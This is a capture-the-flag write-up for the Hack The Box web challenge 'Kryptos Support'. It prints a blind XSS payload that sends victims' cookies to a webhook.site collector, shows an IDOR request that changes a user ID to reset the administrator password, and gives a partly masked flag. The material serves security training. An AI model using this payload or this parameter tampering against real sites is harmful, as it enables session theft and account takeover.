---
layout: writeup
name: "Kryptos_Support"
platform: "HackTheBox"
category: "challenges"
difficulty: "Medium"
permalink: /writeups/challenges/kryptos-support/
os: "Hack The Box Challenge"
date: 2026-02-25
pwned: true
---

# 🧪 Challenge Name: `Kryptos Support`

**Platform:** Hack The Box (Challenge)  
**Difficulty:** Medium

---

## 🧭 Overview

Kryptos Support is a web challenge that involves chaining a Blind XSS vulnerability to hijack a moderator session and then abusing an Insecure Direct Object Reference (IDOR) to reset the administrator password. It’s highly relevant to CBBH prep, as it practices cookie exfiltration and API parameter tampering.

---

## 🔍 Recon & Functionality

- Landing page: `/` with a simple ticket submission form
- Backend login panel at `/login`
- Suspected XSS injection point in the ticket message form

---

## 🚨 Exploitation Steps

### 1. 🧪 Blind XSS for Moderator Access

Submitted the following payload in the message field:

```html
<script>
  new Image().src="http://webhook.site/abc123?c="+document.cookie;
</script>
```

- ✅ Payload executed by a moderator reviewing tickets
- ✅ Session cookie exfiltrated to webhook.site

Set stolen cookie in browser → Visited `/admin` → Gained access to `/tickets`

---

### 2. 🔓 IDOR for Admin Takeover

Visited `/settings`, and intercepted the following request during password change:

```json
{
  "uid": 10,
  "newpassword": "hackedpass"
}
```

Modified `uid` to `1`:

```json
{
  "uid": 1,
  "newpassword": "hackedpass"
}
```

- ✅ Successfully reset admin password
- ✅ Logged in as `admin` with new password
- ✅ Captured flag

---

## 🏁 Flags

- **Flag:** `HTB{p0pp1ng_x55_4nd_id0********}`

---

## 🧠 Lessons Learned

- How to exfiltrate cookies via blind XSS using webhook tools
- How to detect and abuse IDOR by manipulating user ID parameters
- Importance of securing admin endpoints and validating access control
